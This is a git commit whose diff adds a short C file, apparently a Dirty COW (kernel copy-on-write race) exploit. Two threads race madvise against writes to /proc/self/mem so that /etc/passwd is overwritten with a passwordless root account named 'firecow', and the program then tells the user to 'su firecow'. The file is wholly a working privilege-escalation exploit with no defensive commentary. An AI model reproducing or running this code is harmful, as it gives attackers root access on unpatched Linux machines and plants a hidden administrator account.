3c62abf5c334e0b5f37f7aa8222e17002d4694e6
tron-security <103330113+tron-security@users.noreply.github.com>
2025-05-15 01:15:12 +0400

    Create dirtycow_new.c

---
+++ dirtycow_new.c
@@ -0,0 +1,35 @@
+// dirtycow_quick.c
+#include <fcntl.h>
+#include <pthread.h>
+#include <string.h>
+#include <stdio.h>
+#include <unistd.h>
+ 
+char *target = "/etc/passwd";
+char backup[] = "firecow::0:0:root:/root:/bin/bash\n";
+ 
+void *madviseThread(void *arg) {
+  for (int i = 0; i < 1000000; i++) {
+    madvise((void *)arg, 100, MADV_DONTNEED);
+  }
+}
+ 
+void *writeThread(void *arg) {
+  int fd = open("/proc/self/mem", O_RDWR);
+  for (int i = 0; i < 1000000; i++) {
+    lseek(fd, (off_t)arg, SEEK_SET);
+    write(fd, backup, sizeof(backup));
+  }
+}
+ 
+int main() {
+  int f = open(target, O_RDONLY);
+  char *map = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, f, 0);
+  pthread_t p1, p2;
+  pthread_create(&p1, NULL, madviseThread, map);
+  pthread_create(&p2, NULL, writeThread, map);
+  pthread_join(p1, NULL);
+  pthread_join(p2, NULL);
+  printf("Try: su firecow\n");
+  return 0;
+}
